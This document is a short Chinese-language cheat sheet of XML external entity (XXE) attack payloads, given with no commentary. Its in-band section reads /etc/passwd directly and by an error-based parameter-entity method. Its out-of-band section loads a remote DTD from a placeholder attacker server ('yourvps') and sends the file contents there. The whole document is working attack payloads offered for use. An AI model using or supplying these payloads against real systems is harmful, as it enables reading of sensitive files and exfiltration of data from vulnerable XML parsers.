### 回显
```xml
<!DOCTYPE a [
<!ELEMENT name ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<root>
<name>&xxe;</name>
</root>

<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE a [
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<root>
<name>&xxe;</name>
</root>

<?xml version="1.0" ?>
<!DOCTYPE message [
	<!ENTITY % file SYSTEM "file:///etc/passwd">
	<!ENTITY % a '
		<!ENTITY &#x25; b "
			<!ENTITY error  &#x27;&#x25;file;&#x27;
			>
		">
	'>
%a;
%b;
]>
<name>&error;</name>
```

### 带外xxe的基础payload

payload
```xml
<?xml version="1.0" ?>
<!DOCTYPE data [
<!ENTITY a SYSTEM "http://xxx.xxx.xxx.xxx">
]>


<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://yourvps/xxe.xml">
%dtd; %all;
]>
<value>&send;</value>
```
xxe.xml
```
<!ENTITY % all "<!ENTITY send SYSTEM 'http://yourvps/%file;'>">
```